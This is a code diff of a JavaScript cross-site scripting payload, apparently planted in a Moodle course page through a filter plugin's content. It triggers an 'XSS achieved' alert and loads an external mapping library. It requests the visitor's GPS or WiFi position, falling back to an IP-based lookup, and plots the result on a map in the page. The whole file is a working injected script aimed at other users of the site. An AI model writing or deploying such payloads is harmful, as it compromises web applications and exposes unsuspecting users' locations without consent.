@@ -1,13 +1,11 @@
 alert('XSS achieved!!! :3 ~ wntiv_, 162.159.137.232, amsaynz');
-// document.querySelector('.userprofile .description div').remove();
 
 (function(){
   if(new URLSearchParams(window.location.search).get('id') !== '219026') return;
 
   const el = document.querySelector('.filter_generico_tabitem[title*="moodle-xss"]');
-  if (!el) return;
-
-  if (!el.style.height) el.style.height = '400px';
+  if(!el) return;
+  if(!el.style.height) el.style.height = '400px';
 
   const link = document.createElement('link');
   link.rel = 'stylesheet';
@@ -16,7 +14,14 @@ alert('XSS achieved!!! :3 ~ wntiv_, 162.159.137.232, amsaynz');
 
   const script = document.createElement('script');
   script.src = 'https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.js';
-  script.onload = () => {
+  document.head.appendChild(script);
+
+  function waitForLeaflet() {
+    if(typeof L === 'undefined') {
+      setTimeout(waitForLeaflet, 50);
+      return;
+    }
+
     const showMap = (lat, lon, label) => {
       const map = L.map(el).setView([lat, lon], 13);
       L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
@@ -32,7 +37,7 @@ alert('XSS achieved!!! :3 ~ wntiv_, 162.159.137.232, amsaynz');
         .then(d => showMap(d.latitude, d.longitude, `Approximate location (IP): ${d.city}, ${d.country_name}`));
     };
 
-    if(navigator.geolocation) {
+    if(navigator.geolocation){
       navigator.geolocation.getCurrentPosition(
         pos => showMap(pos.coords.latitude, pos.coords.longitude, "Precise location (GPS/WiFi)"),
         useIP
@@ -40,6 +45,7 @@ alert('XSS achieved!!! :3 ~ wntiv_, 162.159.137.232, amsaynz');
     } else {
       useIP();
     }
-  };
-  document.head.appendChild(script);
+  }
+
+  waitForLeaflet();
 })();
